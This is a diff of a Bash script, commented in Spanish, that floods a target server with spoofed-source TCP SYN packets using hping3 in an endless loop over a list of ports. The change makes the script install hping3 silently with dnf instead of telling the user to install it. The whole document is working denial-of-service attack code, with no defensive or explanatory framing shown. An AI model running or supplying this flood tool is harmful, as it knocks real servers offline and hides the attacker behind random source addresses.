@@ -28,8 +28,10 @@ IFS=',' read -ra PUERTOS <<< "$PUERTOS_STR"
 
 
 if ! command -v hping3 &>/dev/null; then
-	error "ejecuta dnf install hping3 y vuelve a ejecutar"
+	dnf install -y -q hping3
 fi
+
+HPING3_SOURCE=$(command -v hping3)
 
 #Verificando que el servidor a atacar este encendido
 
@@ -68,7 +70,7 @@ EOF
 while true; do
 	for PUERTO in "${PUERTOS[@]}"; do
 		info "Atacando puerto $PUERTO..."
-		timeout 10 hping3 -S -p $PUERTO --flood --rand-source $IP_OBJETIVO
+		timeout 10 $HPING3_SOURCE -S -p $PUERTO --flood --rand-source $IP_OBJETIVO
 	done
 done
 
